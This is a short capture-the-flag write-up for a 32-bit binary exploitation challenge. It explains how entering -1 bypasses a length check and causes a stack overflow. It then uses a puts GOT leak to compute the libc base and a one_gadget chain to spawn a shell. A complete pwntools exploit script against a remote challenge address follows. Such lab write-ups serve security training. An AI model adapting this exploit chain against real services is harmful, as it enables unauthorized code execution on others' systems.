First use patchelf to swap the library
Then, by inputting the character -1 to bypass the check — -1 corresponds to 0xffffffff (32-bit) — the next read causes an overflow. Construct the payload: first overwrite the return address with the address of the puts function, then the address of the work function (puts's return address), then puts's argument, which is the address of puts's GOT entry. The first work call then leaks the puts address (first use one_gadget to find a usable gadget; I finally chose the one at 0x6749f, because esi generally meets its requirement, and a gadget for eax is easier to find, as shown above), thereby obtaining the libc base address. Then in the second work call, input the character -1 again, and overwrite the return address with the address of a pop eax; ret gadget, followed by 0, and finally the onegadget address — successfully getting a shell

from pwn import*
#context(os="linux",arch="i386",log_level="debug")
s=remote("124.71.135.126",30043)
#s=process("./pwn")
f=ELF("./pwn")
libc=ELF("./libc-2.27.so")
#gdb.attach(s,"b main")
s.recvuntil(b"input world tag: ")
s.sendline(b"1")
s.sendline(b"-1")
s.recvuntil(b"leave me a msg:")
payload=b"a"*64+p32(f.sym["puts"])+p32(f.sym["work"])+p32(f.got["puts"])
#+f.got["puts"]
s.sendline(payload)
put_addr=u32(s.recvline()[0:4])
libc_base=put_addr-libc.sym["puts"]

system_addr=libc_base+0x6749f 
payload=b"a"*64+p32(0x00024d37+libc_base)+p32(0)+p32(system_addr)
s.sendline(b"-1")
s.recvuntil(b"leave me a msg:")

s.sendline(payload)
